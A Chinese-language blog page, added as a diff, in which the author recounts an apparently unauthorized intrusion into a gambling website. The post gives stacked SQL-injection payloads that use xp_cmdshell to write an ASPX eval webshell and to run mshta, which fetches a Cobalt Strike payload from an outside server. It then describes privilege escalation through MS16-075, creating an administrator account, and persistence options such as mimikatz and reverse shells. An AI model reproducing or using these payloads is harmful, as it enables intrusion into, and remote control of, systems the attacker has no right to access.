@@ -1,0 +1,212 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>记录某博彩网站渗透 | Mssn Harvey</title><meta name="keywords" content="渗透"><meta name="author" content="Harvey"><meta name="copyright" content="Harvey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最初，我得到的只有一个后台网址，深深吸了口烟，可攻击点太少了。如果没有弱口令，注入，和直接rce的点，是很难打开缺口的所以首先第一步要做的事情进行信息搜集了！渗透的本质是信息收集的在网络空间安全搜索引擎fofa上查询一下，再就是端口扫描 ，直接略过，懂的都懂。有利用价值的端口：80,81,1433,3389脆弱点：http:&#x2F;&#x2F;49.xxx.xx.xxx:81&#x2F;Login&#x2F;index但是通过一段常">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记录某博彩网站渗透">
+<meta property="og:url" content="http://example.com/0202/12/05/%E8%AE%B0%E5%BD%95%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="Mssn Harvey">
+<meta property="og:description" content="最初，我得到的只有一个后台网址，深深吸了口烟，可攻击点太少了。如果没有弱口令，注入，和直接rce的点，是很难打开缺口的所以首先第一步要做的事情进行信息搜集了！渗透的本质是信息收集的在网络空间安全搜索引擎fofa上查询一下，再就是端口扫描 ，直接略过，懂的都懂。有利用价值的端口：80,81,1433,3389脆弱点：http:&#x2F;&#x2F;49.xxx.xx.xxx:81&#x2F;Login&#x2F;index但是通过一段常">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(26).jpg">
+<meta property="article:published_time" content="0202-12-05T06:15:29.000Z">
+<meta property="article:modified_time" content="2021-03-21T06:32:32.442Z">
+<meta property="article:author" content="Harvey">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(26).jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/0202/12/05/%E8%AE%B0%E5%BD%95%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-03-21 14:32:32'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(26).jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Mssn Harvey</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">记录某博彩网站渗透</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="0202-12-05T06:15:29.000Z" title="发表于 0202-12-05 14:21:12">0202-12-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-21T06:32:32.442Z" title="更新于 2021-03-21 14:32:32">2021-03-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Gamma%E5%AE%9E%E9%AA%8C%E5%AE%A4/">Gamma实验室</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>最初，我得到的只有一个后台网址，深深吸了口烟，可攻击点太少了。<br>如果没有弱口令，注入，和直接rce的点，是很难打开缺口的<br>所以首先第一步要做的事情进行信息搜集了！<br>渗透的本质是信息收集的<br>在网络空间安全搜索引擎fofa上查询一下，再就是端口扫描 ，直接略过，懂的都懂。<br>有利用价值的端口：80,81,1433,3389<br>脆弱点：<a target="_blank" rel="noopener" href="http://49.xxx.xx.xxx/">http://49.xxx.xx.xxx</a>:81/Login/index<br>但是通过一段常规操作操作后，发现后台登录界面存在堆叠注入！<br>且获得如下信息：<br>SQL注入post包(在响应包中得到ASP.NET+Microsoft-IIS/7.5)<br>权限：SA</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/334607215.png"></p>
+<p>刚开始得到注入就想着进入后台看看，但是没有回显，就肝了一段时间的py脚本。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2145323975.png"></p>
+<p>得到密码进入后台，模板千篇一律，无数据备份，无修改模板，上传个人判断基于白名单，有编辑器不过示例代码已删除，留言板不可留言，回过头来又看注入，既然是堆叠注入，那就可以执行SQL语句，然后一顿操作，嗯嗯嗯… 没有回显，代码如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1251178843.png"></p>
+<p>以为到这里就结束了，没想到 3389端口登录失败，1433端口连接失败！这里我很懵，经过大佬的一番指导，可以把注入信息通过外带DNSLlog，或者直接使用xp_cmdshell执行命令，但是不知道是否开启，所有尝试了一下ping以下dnslog,还好前几天补过：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1861135234.png"></p>
+<p>既然dnslog有回显，那就证明xp_cmdshel扩展开启，可以执行命令，这里两种思路:<br>第一种是cmd执行命令，输出到网站根目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;exec master…xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;“Jscript”%&gt;&lt;%eval(Request.Item[“pass”],“unsafe”);%^&gt; &gt; c:\网站路径\shell.aspx’;–</span><br></pre></td></tr></table></figure>
+
+<p>由于我爆不出来绝对路径就采用了第二种方法<br>第二种是下载木马，运行木马直接上线<br>cs设置好监听器，生成一个html application文件，然后上传到cs服务器上<br>在注入点执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;; exec master.dbo.xp_cmdshell ‘mshta http:&#x2F;&#x2F;39.xx.xxx.xxx:80&#x2F;download&#x2F;file.ext’; –</span><br></pre></td></tr></table></figure>
+
+<p>过一会儿有台主机上线了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2532348242.png"></p>
+<p>补丁安装200多，较多，把systeminfo中的信息漏洞对比，看有没有漏补的，发现可利用漏洞ms16-075<br>systeminfo | findstr KB3164038<br><a target="_blank" rel="noopener" href="https://github.com/vysecurity/reflectivepotato.git">https://github.com/vysecurity/reflectivepotato.git</a> github上该exp的cna插件，加载到脚本管理器中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/370159021.png"></p>
+<p>我这里直接创建管理员，但是更隐蔽的方法是通过mimikatz读取hash或者SSP获取明文密码，来获取持久控制，或者利用计划任务，过一段时间反弹shell回来！</p>
+<p>渗透本就是逆天而行！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Harvey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/0202/12/05/%E8%AE%B0%E5%BD%95%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/">http://example.com/0202/12/05/%E8%AE%B0%E5%BD%95%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Mssn Harvey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(26).jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/IMG_20210320_145848.png" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/IMG_20210320_145848.png" alt="WeChat"/></a><div class="post-qr-code-desc">WeChat</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1616223647_edit_497335509645465.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1616223647_edit_497335509645465.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/0202/12/30/windows%E6%8F%90%E6%9D%83%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(17).jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">windows提权看这一篇就够了</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/09/从代码审计到拿下某菠菜客服站/" title="从代码审计到拿下某菠菜客服站"><img class="cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(3).jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-09</div><div class="title">从代码审计到拿下某菠菜客服站</div></div></a></div><div><a href="/0202/12/31/记一次菠菜站对护卫神的利用/" title="记一次菠菜站对护卫神的利用"><img class="cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(58).jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 0202-12-31</div><div class="title">记一次菠菜站对护卫神的利用</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Harvey</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MssnHarvey/mssnharvey.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=3305601910" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="https://t.me/MssnHarvey" target="_blank" title="Telegram"><i class="fab fa-telegram"></i></a><a class="social-icon" href="https://github.com/MssnHarvey" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3305601910@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">Welcome to Harvey'Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/09/29/TCTF%20Final%20WP/" title="TCTF Final WP"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3368874837.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TCTF Final WP"/></a><div class="content"><a class="title" href="/2021/09/29/TCTF%20Final%20WP/" title="TCTF Final WP">TCTF Final WP</a><time datetime="2021-09-29T07:02:00.000Z" title="发表于 2021-09-29 15:02:00">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="记一次对某大学的逻辑漏洞"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(2).png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次对某大学的逻辑漏洞"/></a><div class="content"><a class="title" href="/2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="记一次对某大学的逻辑漏洞">记一次对某大学的逻辑漏洞</a><time datetime="2021-03-20T13:11:00.000Z" title="发表于 2021-03-20 21:11:00">2021-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1689581160.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-Web分类练习"/></a><div class="content"><a class="title" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习">BUUCTF-Web分类练习</a><time datetime="2021-03-16T06:33:20.000Z" title="发表于 2021-03-16 14:33:20">2021-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/dc3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-3靶机渗透测试报告"/></a><div class="content"><a class="title" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告">DC-3靶机渗透测试报告</a><time datetime="2021-03-15T06:11:00.000Z" title="发表于 2021-03-15 14:11:00">2021-03-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/14/2021VNCTF/" title="VNCTF 2021"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/653112701.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VNCTF 2021"/></a><div class="content"><a class="title" href="/2021/03/14/2021VNCTF/" title="VNCTF 2021">VNCTF 2021</a><time datetime="2021-03-14T07:13:20.000Z" title="发表于 2021-03-14 15:13:20">2021-03-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Harvey</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><img src="https://web-resource.mucang.cn/maiche.web/mucang.official/official/resources/images/new-version/beian.png" width="20" height="20" /> </img> 闽ICP备20002768号</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(()=>{
+  const $countDom = document.getElementById('twikoo-count')
+  const init = () => {
+    let initData = {
+      el: '#twikoo-wrap',
+      envId: '',
+      region: ''
+    }
+
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    twikoo.init(initData)
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: '',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      $countDom.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const loadTwikoo = (bool = false) => {
+    if (typeof twikoo === 'object') {
+      init()
+      bool && $countDom && setTimeout(getCount,0)
+    } else {
+      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
+        init()
+        bool && $countDom && setTimeout(getCount,0)
+      })
+    }
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo(true)
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="000PeZCQ1i4XVs" data-server="tencent" data-type="artist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
